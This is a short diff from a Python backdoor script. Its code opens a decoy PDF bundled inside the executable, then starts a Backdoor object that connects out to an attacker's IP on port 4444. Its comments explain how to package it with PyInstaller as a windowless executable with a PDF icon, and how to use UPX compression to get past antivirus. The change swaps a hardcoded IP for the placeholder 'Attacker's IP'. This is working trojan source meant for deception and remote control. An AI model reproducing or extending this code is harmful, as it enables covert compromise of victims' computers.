@@ -87,11 +87,11 @@ file_name = sys._MEIPASS + "\sample.pdf" # Location for pdf
 subprocess.Popen(file_name, shell=True) # Open the pdf file
 
 try:
-    my_backdoor = Backdoor("192.168.29.5", 4444) # Create an object of the class
+    my_backdoor = Backdoor("Attacker's IP", 4444) # Create an object of the class
     my_backdoor.run() # Call the run method
 except Exception:
     sys.exit()
 
 # This dosen't bypass the antivirus u can do it by using upx and compressing .exe file
 # Package this script into an executable file with PyInstaller and make sure to be packaged in windows computer
-# Pyinstaller.exe --add-data “location\\sample.pdf, . ” -—onefile -—nonconsole --icon pdf.ico backdoor.py
+# Path\Pyinstaller.exe --add-data “location\\sample.pdf, . ” -—onefile -—nonconsole --icon pdf.ico backdoor.py
